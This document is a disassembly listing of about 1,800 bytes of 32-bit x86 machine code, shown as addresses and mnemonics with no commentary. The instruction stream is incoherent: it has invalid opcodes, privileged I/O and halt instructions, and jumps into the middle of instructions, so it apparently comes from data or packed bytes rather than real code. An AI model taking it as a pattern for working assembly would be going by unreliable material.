  40d269:	jb     0x40d26a
  40d26b:	inc    ebp
  40d26c:	push   es
  40d26d:	enter  0x9ab3,0x9d
  40d271:	push   ds
  40d272:	mov    esi,0xc3b20693
  40d277:	loopne 0x40d270
  40d279:	cli    
  40d27a:	retf   0x49c1
  40d27d:	cli    
  40d27e:	sub    BYTE PTR [edi],bl
  40d280:	mov    esi,0x4db82d40
  40d285:	xchg   DWORD PTR [edx+ebp*2-0x46baabd3],eax
  40d28c:	neg    BYTE PTR [ecx+0x3a]
  40d28f:	jl     0x40d23b
  40d291:	popa   
  40d292:	sbb    esp,edx
  40d294:	fist   DWORD PTR [ecx+0x65b2c076]
  40d29a:	sbb    ah,BYTE PTR [ecx]
  40d29c:	lds    esp,FWORD PTR [ecx]
  40d29e:	inc    esp
  40d29f:	cmp    ah,cl
  40d2a1:	jno    0x40d2a3
  40d2a3:	cmp    edx,DWORD PTR [eax+0x5c201c21]
  40d2a9:	out    0x11,al
  40d2ab:	mov    eax,ds:0x72c0ffc6
  40d2b0:	mov    esi,0xbacb50a8
  40d2b5:	mov    eax,DWORD PTR [edx+ebx*2+0x44]
  40d2b9:	xor    al,0x1c
  40d2bb:	xor    al,0xc6
  40d2bd:	enter  0xf619,0xd0
  40d2c1:	mov    al,ds:0x6cf1a7c9
  40d2c6:	imul   cl
  40d2c8:	push   0x2f
  40d2ca:	mov    edi,0x599aff38
  40d2cf:	xor    al,0x3b
  40d2d1:	push   cs
  40d2d2:	sbb    al,BYTE PTR [ecx-0x72]
  40d2d5:	mov    eax,0x64a008e3
  40d2da:	push   cs
  40d2db:	daa    
  40d2dc:	push   edx
  40d2dd:	(bad)  
  40d2de:	ins    BYTE PTR es:[edi],dx
  40d2df:	mov    edx,0x425fdaf2
  40d2e4:	addr16 and al,0x8e
  40d2e7:	(bad)  
  40d2e8:	mov    al,0xd4
  40d2ea:	shl    DWORD PTR [ebx-0x56726d62],1
  40d2f0:	cmp    ebx,DWORD PTR ds:0xffe1adff
  40d2f6:	sbb    BYTE PTR [eax+0x48],0xaa
  40d2fa:	cmp    al,0x8d
  40d2fc:	jbe    0x40d37d
  40d2fe:	xchg   ecx,eax
  40d2ff:	dec    ecx
  40d300:	test   BYTE PTR [eax-0x74],ah
  40d303:	xchg   edi,eax
  40d304:	jecxz  0x40d317
  40d306:	mov    ds:0xff0e7c7d,eax
  40d30b:	cmp    al,BYTE PTR [edx]
  40d30d:	push   ss
  40d30e:	call   0x68e9:0xa7fc6d07
  40d315:	xchg   ebx,eax
  40d316:	xchg   ebx,eax
  40d317:	in     eax,dx
  40d318:	xor    BYTE PTR [edi],bl
  40d31a:	sub    al,0x66
  40d31c:	in     al,0x49
  40d31e:	ret    0xf0ab
  40d321:	mov    ebp,0x86f21dd1
  40d326:	jnp    0x40d32c
  40d328:	mov    WORD PTR [edi-0x70],gs
  40d32b:	inc    eax
  40d32c:	dec    esi
  40d32d:	jno    0x40d3a3
  40d32f:	aas    
  40d330:	xchg   BYTE PTR [eax+0x75],bl
  40d333:	fwait
  40d334:	add    al,0xde
  40d336:	in     eax,dx
  40d337:	ror    dl,0x17
  40d33a:	xor    eax,DWORD PTR [eax]
  40d33c:	adc    BYTE PTR [edi],cl
  40d33e:	nop
  40d33f:	push   edi
  40d340:	les    edi,FWORD PTR [eax]
  40d342:	cdq    
  40d343:	sbb    cl,BYTE PTR ds:0x65bda891
  40d349:	pop    eax
  40d34a:	add    BYTE PTR [eax-0x47],al
  40d34d:	aam    0x51
  40d34f:	or     ebx,DWORD PTR [esi]
  40d351:	adc    DWORD PTR [esi],0x2aa00935
  40d357:	lods   al,BYTE PTR ds:[esi]
  40d358:	pop    eax
  40d359:	mov    edi,0xa3af1f7c
  40d35e:	dec    ecx
  40d35f:	xchg   bl,cl
  40d361:	jecxz  0x40d2e4
  40d363:	popa   
  40d364:	pop    esi
  40d365:	xlat   BYTE PTR ds:[ebx]
  40d366:	hlt    
  40d367:	inc    esi
  40d368:	popf   
  40d369:	xchg   edx,eax
  40d36a:	jae    0x40d3b1
  40d36c:	pop    ebp
  40d36d:	dec    edi
  40d36e:	repz xlat BYTE PTR ds:[ebx]
  40d370:	test   DWORD PTR [esi+0x65],esi
  40d373:	xlat   BYTE PTR ds:[ebx]
  40d374:	cld    
  40d375:	mov    esp,0xaabd9b87
  40d37a:	pop    es
  40d37b:	mov    bh,0xdb
  40d37d:	retf   
  40d37e:	mov    bl,0xfe
  40d380:	xor    eax,0x2a001160
  40d385:	xchg   ebx,ecx
  40d387:	cmp    dh,ah
  40d389:	jp     0x40d33c
  40d38b:	pcmpeqb mm4,mm2
  40d38e:	test   BYTE PTR [edx-0x6ce02450],dh
  40d394:	push   ds
  40d395:	mov    ebx,0xe3598341
  40d39a:	ja     0x40d3f1
  40d39c:	aad    0x14
  40d39e:	push   esi
  40d39f:	mov    ebp,0xf839dba4
  40d3a4:	mov    esi,0x288b20ff
  40d3a9:	test   BYTE PTR [edx],bh
  40d3ab:	sahf   
  40d3ac:	call   0x316c:0x2857c410
  40d3b3:	repnz repz sbb BYTE PTR ds:0x9acc9beb,dl
  40d3bb:	add    eax,0x6ea65269
  40d3c0:	jo     0x40d37a
  40d3c2:	and    ah,dl
  40d3c4:	xor    ah,ch
  40d3c6:	(bad)  
  40d3c7:	addr16 xchg esp,eax
  40d3c9:	loopne 0x40d441
  40d3cb:	repnz scas al,BYTE PTR es:[edi]
  40d3cd:	xor    dh,BYTE PTR [edx-0x3adb310b]
  40d3d3:	fistp  WORD PTR [ebp+edx*4-0x75]
  40d3d7:	lea    esi,[ebx]
  40d3d9:	inc    eax
  40d3da:	inc    eax
  40d3db:	or     BYTE PTR [eax],bl
  40d3dd:	or     DWORD PTR [esi],ebp
  40d3df:	fdivrp st(7),st
  40d3e1:	cmp    al,0x88
  40d3e3:	jl     0x40d3ca
  40d3e5:	push   edx
  40d3e6:	adc    BYTE PTR [ecx+0xd9b8550],0x49
  40d3ed:	push   esp
  40d3ee:	stos   DWORD PTR es:[edi],eax
  40d3ef:	jecxz  0x40d38a
  40d3f1:	inc    ebp
  40d3f2:	sub    DWORD PTR [ecx-0x1a280891],esp
  40d3f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d3fa:	push   0xffffffff
  40d3fc:	aas    
  40d3fd:	das    
  40d3fe:	test   DWORD PTR [ebx-0x1b],edx
  40d401:	in     eax,dx
  40d402:	ret    0x1b8e
  40d405:	mov    cl,0x34
  40d407:	pop    esi
  40d408:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d409:	not    BYTE PTR [edi]
  40d40b:	lods   al,BYTE PTR ds:[esi]
  40d40c:	sub    eax,0x9a3ef6db
  40d411:	push   ebx
  40d412:	pushf  
  40d413:	ror    ch,0x87
  40d416:	mov    esi,0xcacde8d4
  40d41b:	xchg   ebp,eax
  40d41c:	push   edi
  40d41d:	jmp    0x40d409
  40d41f:	push   eax
  40d420:	jle    0x40d3e6
  40d422:	cmp    eax,0xcc6a3fcd
  40d427:	test   eax,0x715ac35c
  40d42c:	mov    bl,0x29
  40d42e:	cld    
  40d42f:	pop    ebx
  40d430:	dec    esp
  40d431:	jo     0x40d46e
  40d433:	or     DWORD PTR [esi+0x3520352],ebx
  40d439:	xchg   ecx,eax
  40d43a:	or     al,0xb2
  40d43c:	pop    ebp
  40d43d:	jecxz  0x40d485
  40d43f:	cmp    bh,BYTE PTR [edi-0x75]
  40d442:	cmp    BYTE PTR [edx-0xd],dh
  40d445:	and    ebx,DWORD PTR [eax-0x7cf952ac]
  40d44b:	sub    edx,DWORD PTR [edx+0x5b12189c]
  40d451:	fcomp  st(2)
  40d453:	adc    edx,ecx
  40d455:	xchg   BYTE PTR ds:0x2f1d2d18,ch
  40d45b:	xchg   ebp,eax
  40d45c:	ins    DWORD PTR es:[edi],dx
  40d45d:	fwait
  40d45e:	lods   eax,DWORD PTR ds:[esi]
  40d45f:	lahf   
  40d460:	in     al,0xc2
  40d462:	mov    dh,0xb
  40d464:	mov    ebp,eax
  40d466:	int    0x93
  40d468:	add    eax,0xdcf6c89e
  40d46d:	and    ah,BYTE PTR [ebx]
  40d46f:	cmp    BYTE PTR [eax+0x73],cl
  40d472:	or     BYTE PTR [eax],ah
  40d474:	push   ebx
  40d475:	aas    
  40d476:	arpl   WORD PTR [ebx-0x59],ax
  40d479:	je     0x40d484
  40d47b:	imul   edi,esp,0xd882f604
  40d481:	test   al,0x8b
  40d483:	dec    ebp
  40d484:	clc    
  40d485:	mov    DWORD PTR [ecx+0x10],eax
  40d488:	mov    eax,eax
  40d48a:	jmp    0x40d995
  40d48f:	ror    al,0xcc
  40d492:	cmp    eax,0xd5d9c1d4
  40d497:	jg     0x40d500
  40d499:	jne    0x40d439
  40d49b:	out    dx,al
  40d49c:	cmc    
  40d49d:	push   cs
  40d49e:	mov    ah,0xcc
  40d4a0:	mov    ch,0x78
  40d4a2:	js     0x40d50e
  40d4a4:	jl     0x40d51e
  40d4a6:	js     0x40d51c
  40d4a8:	add    ah,BYTE PTR [ebx-0x48]
  40d4ab:	adc    bh,BYTE PTR [ebp-0x75376f4b]
  40d4b1:	stc    
  40d4b2:	and    edx,DWORD PTR ds:0x7fda37e0
  40d4b8:	scas   eax,DWORD PTR es:[edi]
  40d4b9:	retf   0xadc
  40d4bc:	arpl   dx,cx
  40d4be:	hlt    
  40d4bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d4c0:	int3   
  40d4c1:	les    esi,FWORD PTR [ecx+0x37]
  40d4c4:	mov    dh,0x96
  40d4c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d4c7:	adc    BYTE PTR [edx-0x24],dl
  40d4ca:	das    
  40d4cb:	adc    esi,DWORD PTR [ecx-0x19efa883]
  40d4d1:	jne    0x40d4fe
  40d4d3:	and    ebp,DWORD PTR [esi-0x915221b]
  40d4d9:	pop    edx
  40d4da:	inc    edx
  40d4db:	jbe    0x40d4d8
  40d4dd:	push   eax
  40d4de:	jp     0x40d4c4
  40d4e0:	mov    ds:0x249c34c3,al
  40d4e5:	adc    BYTE PTR [eax+ebx*8+0x7c],ah
  40d4e9:	icebp  
  40d4ea:	std    
  40d4eb:	repz mov ch,0x33
  40d4ee:	and    eax,0x63bc9787
  40d4f3:	dec    ebp
  40d4f4:	inc    esp
  40d4f5:	arpl   WORD PTR [edi+0x8],di
  40d4f8:	xchg   edi,eax
  40d4f9:	dec    esp
  40d4fa:	mov    edx,0x7178340
  40d4ff:	xor    eax,0x440aaba6
  40d504:	xchg   ah,dl
  40d506:	call   0xeec4167f
  40d50b:	and    ebp,eax
  40d50d:	cmp    al,bl
  40d50f:	fld    DWORD PTR [eax+0x5f]
  40d512:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d513:	ficomp WORD PTR [eax+0x0]
  40d516:	in     eax,dx
  40d517:	imul   ecx,DWORD PTR [edx+0x69],0xfffffffa
  40d51b:	(bad)
  40d51f:	iret   
  40d520:	xlat   BYTE PTR ds:[ebx]
  40d521:	call   0x4519:0x3acbb668
  40d528:	ret    0x34a5
  40d52b:	inc    eax
  40d52c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d52d:	dec    ecx
  40d52e:	ins    DWORD PTR es:[edi],dx
  40d52f:	dec    esi
  40d530:	xor    esp,eax
  40d532:	repz cdq 
  40d534:	stos   BYTE PTR es:[edi],al
  40d535:	mov    al,ds:0x82e288e9
  40d53a:	push   ecx
  40d53b:	out    dx,eax
  40d53c:	ror    DWORD PTR [ebx-0x56],1
  40d53f:	aam    0x74
  40d541:	bound  esp,QWORD PTR [edx]
  40d543:	push   edx
  40d544:	lahf   
  40d545:	fninit 
  40d547:	xchg   ebp,eax
  40d548:	sub    al,0x70
  40d54a:	sti    
  40d54b:	mov    bh,0x50
  40d54d:	add    al,0xc7
  40d54f:	stc    
  40d550:	adc    eax,ebx
  40d552:	ins    DWORD PTR es:[edi],dx
  40d553:	in     al,0xd4
  40d555:	call   0xf3d1d3e2
  40d55a:	pop    es
  40d55b:	sub    al,0x4a
  40d55d:	rcr    DWORD PTR [edx-0x72],1
  40d560:	adc    dl,0x45
  40d563:	fs mov bh,0x6c
  40d566:	and    ebp,eax
  40d568:	loope  0x40d5b9
  40d56a:	popf   
  40d56b:	adc    BYTE PTR [edx],cl
  40d56d:	sbb    al,0xf1
  40d56f:	sub    al,0xd4
  40d571:	dec    ebp
  40d572:	leave  
  40d573:	sub    eax,DWORD PTR [eax+0x4bb2c0bd]
  40d579:	out    0x5d,eax
  40d57b:	and    eax,0x3f6bf263
  40d580:	ins    DWORD PTR es:[edi],dx
  40d581:	pop    es
  40d582:	sbb    ebx,ecx
  40d584:	call   0x1116dcf8
  40d589:	lods   eax,DWORD PTR ds:[esi]
  40d58a:	(bad)  
  40d58b:	mov    ch,0xc
  40d58d:	pop    eax
  40d58e:	sti    
  40d58f:	or     al,BYTE PTR [edi+0x64]
  40d592:	inc    edi
  40d593:	pop    es
  40d594:	push   ebx
  40d595:	hlt    
  40d596:	jl     0x40d558
  40d598:	cdq    
  40d599:	les    ebp,FWORD PTR [eax+0x71]
  40d59c:	outs   dx,BYTE PTR ds:[esi]
  40d59d:	mov    bh,0x40
  40d59f:	dec    edx
  40d5a0:	cs and al,0xa0
  40d5a3:	jp     0x40d538
  40d5a5:	adc    bl,BYTE PTR [ebx+0x73]
  40d5a8:	and    eax,0x543e5f00
  40d5ad:	aad    0x5c
  40d5af:	fdiv   st,st(1)
  40d5b1:	outs   dx,DWORD PTR ds:[esi]
  40d5b2:	sbb    eax,0xae706608
  40d5b7:	xchg   edx,eax
  40d5b8:	data16 mov WORD PTR [ecx+0x3015627a],ss
  40d5bf:	cmp    BYTE PTR es:[edi+0x7b4ab578],bh
  40d5c6:	out    0x1e,eax
  40d5c8:	stc    
  40d5c9:	neg    DWORD PTR [edi]
  40d5cb:	fs rol edi,0x27
  40d5cf:	add    BYTE PTR [ebx+0x5f9a2b45],ch
  40d5d5:	ins    DWORD PTR es:[edi],dx
  40d5d6:	jbe    0x40d63b
  40d5d8:	cmp    al,BYTE PTR [ebp+0x4e1ba65d]
  40d5de:	outs   dx,BYTE PTR ds:[esi]
  40d5df:	inc    esi
  40d5e0:	inc    esp
  40d5e1:	into   
  40d5e2:	inc    ebx
  40d5e3:	mov    ch,0xd5
  40d5e5:	xchg   edi,eax
  40d5e6:	scas   eax,DWORD PTR es:[edi]
  40d5e7:	jns    0x40d64e
  40d5e9:	les    edx,FWORD PTR [esi-0x6f]
  40d5ec:	xchg   BYTE PTR [edi],cl
  40d5ee:	call   0x80a89d7a
  40d5f3:	inc    edi
  40d5f4:	push   0xffffffe8
  40d5f6:	xchg   ebp,edi
  40d5f8:	mov    edx,0x1641e9cf
  40d5fd:	adc    esp,ebp
  40d5ff:	mov    edx,0x90295ae8
  40d604:	pop    ds
  40d605:	cmp    ah,BYTE PTR [ecx-0x2457179e]
  40d60b:	dec    esp
  40d60c:	test   al,0x6f
  40d60e:	sbb    bh,BYTE PTR [edi+0x3f51d6f]
  40d614:	mov    bh,0xb3
  40d616:	jle    0x40d5e4
  40d618:	mov    al,0x3b
  40d61a:	out    dx,al
  40d61b:	mov    bh,0xc7
  40d61d:	pop    es
  40d61e:	jle    0x40d609
  40d620:	mov    WORD PTR [ebx-0x5b7b728c],?
  40d626:	mov    WORD PTR [eax+0xd07ec0a],cs
  40d62c:	jbe    0x40d614
  40d62e:	xor    al,0x94
  40d630:	mov    ecx,0x77da1ccf
  40d635:	xchg   edi,eax
  40d636:	cli    
  40d637:	call   0x93ca24c2
  40d63c:	repnz scas eax,DWORD PTR es:[edi]
  40d63e:	out    dx,eax
  40d63f:	or     eax,0xddab0ace
  40d644:	int3   
  40d645:	popa   
  40d646:	jb     0x40d673
  40d648:	mov    DWORD PTR [esi],esp
  40d64a:	push   edx
  40d64b:	out    0x36,eax
  40d64d:	mov    esp,0x9b1608db
  40d652:	mov    ecx,DWORD PTR [edi-0x57]
  40d655:	mov    edx,0xa67ee258
  40d65a:	sub    edi,edx
  40d65c:	sbb    eax,0x5c6cadaf
  40d661:	imul   ebx,eax,0x6cc8b0d7
  40d667:	fimul  DWORD PTR [esi]
  40d669:	xchg   esi,eax
  40d66a:	xor    esp,eax
  40d66c:	adc    bh,BYTE PTR [ebp-0x7e47e777]
  40d672:	(bad)  
  40d673:	mov    al,ds:0x73e4a2a8
  40d678:	adc    al,0xf4
  40d67a:	cmp    ecx,esi
  40d67c:	mov    ah,0x95
  40d67e:	xchg   BYTE PTR ds:0x973949c,ch
  40d684:	cld    
  40d685:	jae    0x40d64f
  40d687:	outs   dx,BYTE PTR ds:[esi]
  40d688:	push   edx
  40d689:	test   eax,0xdecb9cb3
  40d68e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d68f:	imul   esp,ebp,0xa6ae5abb
  40d695:	add    DWORD PTR [edi-0x20],ebp
  40d698:	xor    DWORD PTR [edx-0x46c45058],esi
  40d69e:	xchg   esi,eax
  40d69f:	loope  0x40d705
  40d6a1:	repnz push ebp
  40d6a3:	sbb    ebp,DWORD PTR [esi+edi*4-0x51]
  40d6a7:	mov    cl,0xae
  40d6a9:	sbb    esi,DWORD PTR [ecx-0x2649c93c]
  40d6af:	push   esp
  40d6b0:	xor    bh,dh
  40d6b2:	sbb    DWORD PTR [esi+0x540c2d0b],0xffffff91
  40d6b9:	call   0xd32:0xa1d4e1d6
  40d6c0:	or     BYTE PTR [esi+0x3f],bl
  40d6c3:	stos   BYTE PTR es:[edi],al
  40d6c4:	sub    eax,0x8ee71cb4
  40d6c9:	jne    0x40d6ad
  40d6cb:	pop    eax
  40d6cc:	inc    ebp
  40d6cd:	dec    edx
  40d6ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6d0:	out    dx,al
  40d6d1:	stc    
  40d6d2:	mov    ds,WORD PTR ds:0x21e8b27e
  40d6d8:	xor    dh,ch
  40d6da:	sar    DWORD PTR [ecx+0x5495cd6e],0xcf
  40d6e1:	es inc eax
  40d6e3:	adc    DWORD PTR [ebx-0x1c],edx
  40d6e6:	jp     0x40d69b
  40d6e8:	mov    edi,0x8f13632f
  40d6ed:	(bad)  
  40d6ee:	mov    cl,0x52
  40d6f0:	pop    ds
  40d6f1:	into   
  40d6f2:	and    ah,ah
  40d6f4:	xchg   ebx,eax
  40d6f5:	aad    0x20
  40d6f7:	outs   dx,BYTE PTR ds:[esi]
  40d6f8:	loop   0x40d724
  40d6fa:	out    0xfe,eax
  40d6fc:	ds push esp
  40d6fe:	sbb    ch,BYTE PTR [edx+0x5b]
  40d701:	pop    eax
  40d702:	mov    ebp,0x3e9e8259
  40d707:	mov    edx,0x5e6bb48d
  40d70c:	in     al,dx
  40d70d:	test   ebx,edx
  40d70f:	std    
  40d710:	jns    0x40d743
  40d712:	sub    al,bl
  40d714:	xchg   ecx,edx
  40d716:	and    ecx,DWORD PTR [eax]
  40d718:	pusha  
  40d719:	stos   BYTE PTR es:[edi],al
  40d71a:	idiv   DWORD PTR [ebx-0x3a8e70f8]
  40d720:	cli    
  40d721:	or     esp,eax
  40d723:	lods   eax,DWORD PTR ds:[esi]
  40d724:	gs xchg esi,eax
  40d726:	adc    DWORD PTR [edx+0x2cecd26a],0x32bba7fa
  40d730:	xchg   ecx,eax
  40d731:	mov    ch,0x81
  40d733:	sub    eax,0xb067ef1f
  40d738:	mov    bl,0xcf
  40d73a:	xor    eax,0x4b31e9cb
  40d73f:	inc    edx
  40d740:	xor    BYTE PTR [eax],bl
  40d742:	shl    DWORD PTR [eax+0x4e815cf5],0xae
  40d749:	ret    
  40d74a:	(bad)  
  40d74b:	(bad)  [esi]
  40d74d:	push   eax
  40d74e:	loopne 0x40d73b
  40d750:	dec    edx
  40d751:	sbb    bh,BYTE PTR [eax]
  40d753:	shl    esi,cl
  40d755:	dec    eax
  40d756:	leave  
  40d757:	jl     0x40d6e0
  40d759:	ja     0x40d6e1
  40d75b:	sbb    BYTE PTR ds:0x6a51f3f0,ah
  40d761:	dec    edx
  40d762:	jge    0x40d75f
  40d764:	jo     0x40d7c0
  40d766:	and    cl,BYTE PTR [edx-0x55376267]
  40d76c:	loope  0x40d78d
  40d76e:	push   cs
  40d76f:	jmp    0x49f0f1ba
  40d774:	push   0x35
  40d776:	dec    edx
  40d777:	jae    0x40d702
  40d779:	stos   BYTE PTR es:[edi],al
  40d77a:	mov    edi,0x57829c80
  40d77f:	or     eax,0x2ec78b74
  40d784:	pusha  
  40d785:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d786:	js     0x40d7e0
  40d788:	(bad)  
  40d789:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  40d78b:	aad    0x20
  40d78d:	mov    al,ds:0xa20f9505
  40d792:	lea    ecx,[esi+0xa3a2918]
  40d798:	and    eax,0x68ffa65e
  40d79d:	pop    ds
  40d79e:	mov    BYTE PTR [eax-0x7b49bc91],bl
  40d7a4:	xchg   ecx,eax
  40d7a5:	adc    DWORD PTR [ebx+0x7d],esi
  40d7a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7a9:	cld    
  40d7aa:	mov    eax,0x4a3cb4bd
  40d7af:	js     0x40d785
  40d7b1:	mov    al,0x46
  40d7b3:	sbb    al,0xc
  40d7b5:	aas    
  40d7b6:	sbb    BYTE PTR [ebx+0x684f6898],0x9f
  40d7bd:	pop    ds
  40d7be:	push   esi
  40d7bf:	iret   
  40d7c0:	test   BYTE PTR [ecx+0x7a935370],bh
  40d7c6:	or     BYTE PTR [ecx],cl
  40d7c8:	rcl    BYTE PTR [edx-0x45bdd086],0x7b
  40d7cf:	call   0xc6603360
  40d7d4:	mov    ah,0xb8
  40d7d6:	and    bh,BYTE PTR [ecx-0x53a7cd20]
  40d7dc:	int3   
  40d7dd:	stos   DWORD PTR es:[edi],eax
  40d7de:	cmp    eax,0x2ac8be04
  40d7e3:	bound  edi,QWORD PTR [esi+0x3d]
  40d7e6:	scas   eax,DWORD PTR es:[edi]
  40d7e7:	dec    edx
  40d7e8:	sub    al,0xb6
  40d7ea:	js     0x40d7a6
  40d7ec:	cwde   
  40d7ed:	jb     0x40d817
  40d7ef:	imul   edx,DWORD PTR [esi-0x1e6149a0],0xffffffdb
  40d7f6:	mov    eax,0x632ac6d4
  40d7fb:	ret    0xc5ce
  40d7fe:	out    0xba,eax
  40d800:	or     ah,cl
  40d802:	add    DWORD PTR [ebx-0x27234ec0],0x4b18f38a
  40d80c:	arpl   WORD PTR [esi],ax
  40d80e:	in     al,dx
  40d80f:	gs stc 
  40d811:	sbb    al,0x58
  40d813:	mov    dl,0xc2
  40d815:	and    cl,BYTE PTR [eax]
  40d817:	into   
  40d818:	mov    bh,0xbe
  40d81a:	int3   
  40d81b:	test   eax,0xeee37114
  40d820:	shl    BYTE PTR [edx],cl
  40d822:	and    al,0x3
  40d824:	cdq    
  40d825:	popf   
  40d826:	sar    dh,1
  40d828:	push   0x2d0d132e
  40d82d:	sub    BYTE PTR [esp+ecx*1+0x659851cd],0x4
  40d835:	test   al,0xcd
  40d837:	add    al,0x16
  40d839:	lea    ebx,[ebp+eax*2+0x75]
  40d83d:	sbb    edi,ebp
  40d83f:	retf   0x7bfb
  40d842:	inc    edi
  40d843:	pusha  
  40d844:	aaa    
  40d845:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d846:	or     eax,0x66370b38
  40d84b:	fcom   DWORD PTR [ecx+0x53]
  40d84e:	mov    esp,0x66b9ef94
  40d853:	aad    0x1
  40d855:	sbb    dh,BYTE PTR [edx+ebp*8]
  40d858:	in     al,dx
  40d859:	ds cdq 
  40d85b:	popf   
  40d85c:	dec    edi
  40d85d:	add    ah,bh
  40d85f:	pop    edi
  40d860:	in     eax,dx
  40d861:	xor    BYTE PTR [esi+0x612feb46],bh
  40d867:	pop    edx
  40d868:	xlat   BYTE PTR ds:[ebx]
  40d869:	out    0x57,eax
  40d86b:	cwde   
  40d86c:	or     BYTE PTR [ebp+0x40fb7b22],bh
  40d872:	es pop ss
  40d874:	cdq    
  40d875:	dec    ebx
  40d876:	cwde   
  40d877:	cmp    al,0xfc
  40d879:	mov    eax,0xa9d2aa87
  40d87e:	in     al,0xcb
  40d880:	test   BYTE PTR [esi+0x2ceb4c5],dl
  40d886:	inc    ebp
  40d887:	rcl    bh,1
  40d889:	cmc    
  40d88a:	fist   DWORD PTR [esp+edx*1+0xf]
  40d88e:	inc    esp
  40d88f:	mov    WORD PTR [ecx+0x31f3bd29],gs
  40d895:	add    eax,0xdccc0e
  40d89a:	jecxz  0x40d885
  40d89c:	cmp    ecx,DWORD PTR [ecx]
  40d89e:	scas   eax,DWORD PTR es:[edi]
  40d89f:	clc    
  40d8a0:	xchg   edi,eax
  40d8a1:	jo     0x40d84b
  40d8a3:	xor    BYTE PTR [esi+0x36e16cee],bl
  40d8a9:	mov    al,0x48
  40d8ab:	add    ebx,DWORD PTR [ebx-0x2a]
  40d8ae:	in     al,0x81
  40d8b0:	jno    0x40d86a
  40d8b2:	jne    0x1ab07e89
  40d8b8:	test   BYTE PTR [edx-0x70],0x6e
  40d8bc:	ja     0x40d87a
  40d8be:	push   ebx
  40d8bf:	dec    edx
  40d8c0:	sub    dh,ch
  40d8c2:	call   0xd7f6120d
  40d8c7:	push   esi
  40d8c8:	adc    edx,DWORD PTR [ecx+0x5c8ffb1e]
  40d8ce:	xor    bh,BYTE PTR [ebp+0x7]
  40d8d1:	pop    edi
  40d8d2:	les    esp,FWORD PTR [ebx]
  40d8d4:	mov    es,esp
  40d8d6:	ja     0x40d902
  40d8d8:	fistp  WORD PTR [edi-0x33]
  40d8db:	pop    edx
  40d8dc:	es push edi
  40d8de:	inc    esi
  40d8df:	mov    bl,0x8
  40d8e1:	mov    bl,0xd3
  40d8e3:	outs   dx,BYTE PTR ds:[esi]
  40d8e4:	jle    0x40d8c7
  40d8e6:	retf   0x8481
  40d8e9:	sbb    DWORD PTR [eax-0x66],esi
  40d8ec:	hlt    
  40d8ed:	scas   al,BYTE PTR es:[edi]
  40d8ee:	mov    edi,0xaf0d4b7c
  40d8f3:	pop    edi
  40d8f4:	push   edi
  40d8f5:	inc    esp
  40d8f6:	sbb    ch,bl
  40d8f8:	pop    ecx
  40d8f9:	cdq    
  40d8fa:	push   edx
  40d8fb:	add    bl,ch
  40d8fd:	sbb    esp,DWORD PTR [esi+ebp*2]
  40d900:	sbb    BYTE PTR [ecx+0x47],dl
  40d903:	ins    BYTE PTR es:[edi],dx
  40d904:	in     al,0xed
  40d906:	or     DWORD PTR [ebp-0x2f],0xffffffe3
  40d90a:	jmp    0x40d988
  40d90c:	stos   BYTE PTR es:[edi],al
  40d90d:	aam    0x89
  40d90f:	clc    
  40d910:	sbb    DWORD PTR [esi],edx
  40d912:	cwde   
  40d913:	popa   
  40d914:	pusha  
  40d915:	jnp    0x40d937
  40d917:	inc    DWORD PTR [ebx]
  40d919:	fs cdq 
  40d91b:	jmp    esi
  40d91d:	lahf   
  40d91e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d91f:	mov    eax,ds:0x67356262
  40d924:	(bad)  
  40d925:	mov    ds:0x961a0abe,al
  40d92a:	lock xlat BYTE PTR ds:[ebx]
  40d92c:	dec    esi
  40d92d:	add    ah,BYTE PTR [edi+0x3416aef2]
  40d933:	inc    esi
  40d934:	pop    ecx
  40d935:	in     eax,0xbe
  40d937:	xor    bl,BYTE PTR [edx-0x4050c715]
  40d93d:	mov    ebp,0x57051f6f
  40d942:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d943:	in     eax,0x44
  40d945:	push   es
  40d946:	icebp  
  40d947:	add    BYTE PTR [esp+ebx*2+0x11b56588],al
  40d94e:	sub    edi,DWORD PTR [ebx]
  40d950:	aas    
  40d951:	retf   0x9698
  40d954:	ds test cl,cl
  40d957:	das    
  40d958:	sbb    al,0xa0
  40d95a:	fs adc ah,bl
  40d95d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d95e:	arpl   WORD PTR [ecx+0x35],ax
  40d961:	mov    al,0x2e
  40d963:	sbb    DWORD PTR ds:0xfa5588a3,esi
  40d969:	stos   BYTE PTR es:[edi],al
  40d96a:	jle    0x40d9d4
  40d96c:	icebp  
  40d96d:	pop    ecx
  40d96e:	cmp    edx,edx
  40d970:	or     edx,esp
  40d972:	inc    ebx
  40d973:	sub    eax,edx
  40d975:	in     eax,dx
  40d976:	rcr    BYTE PTR [ebp+esi*1+0x29],1
  40d97a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d97b:	or     BYTE PTR [ebx+0x49],dl
  40d97e:	loopne 0x40d9c1
  40d980:	ins    DWORD PTR es:[edi],dx
  40d981:	int3   
  40d982:	sahf   
  40d983:	mul    BYTE PTR [esi+ebp*8+0x68]
  40d987:	ins    BYTE PTR es:[edi],dx
  40d988:	hlt    
  40d989:	into   
  40d98a:	and    al,0xc4
  40d98c:	into   
  40d98d:	movhlps xmm6,xmm1
  40d990:	aaa    
  40d991:	js     0x40d989
  40d993:	clc    
  40d994:	mov    bl,0x8b
  40d996:	inc    ebp
  40d997:	fadd   QWORD PTR [ebp-0x2bba7440]
  40d99d:	jne    0x40d9a6
  40d9a3:	mov    eax,DWORD PTR [ebp-0x10]
  40d9a6:	xor    eax,esi
  40d9a8:	jmp    0x40deb3
  40d9ad:	rcl    dl,cl
  40d9af:	ds (bad) 
  40d9b1:	ds fcmovnu st,st(1)
  40d9b4:	fnstcw WORD PTR [esi-0x59]
  40d9b7:	sbb    BYTE PTR [edx+0x3b],al
  40d9ba:	inc    esi
